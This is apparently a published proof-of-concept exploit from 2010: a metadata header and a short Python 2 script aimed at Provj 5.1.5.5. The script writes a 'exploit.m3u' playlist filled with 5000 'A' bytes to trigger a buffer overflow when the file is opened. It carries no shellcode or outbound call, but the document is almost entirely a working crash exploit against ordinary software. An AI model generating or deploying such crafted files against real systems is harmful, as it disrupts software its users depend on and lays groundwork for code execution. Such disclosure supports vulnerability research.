# Exploit Title: Provj 5.1.5.5 (m3u) Buffer Overflow Vulnerability PoC
# Date: 11/30/2010
# Author: 0v3r
# Software Link: http://www.clubdjpro.com/files/provj5.exe
# Version: 5.1.5.5
# Tested on: Windows XP SP3 EN
# CVE: N/A


#!/usr/bin/python

buff = "\x41" * 5000 

try:
 	f = open("exploit.m3u",'w')
	f.write(buff)
	f.close()
	print "[-] File created!\n" 
except:
	print "[-] Error occured!\n" 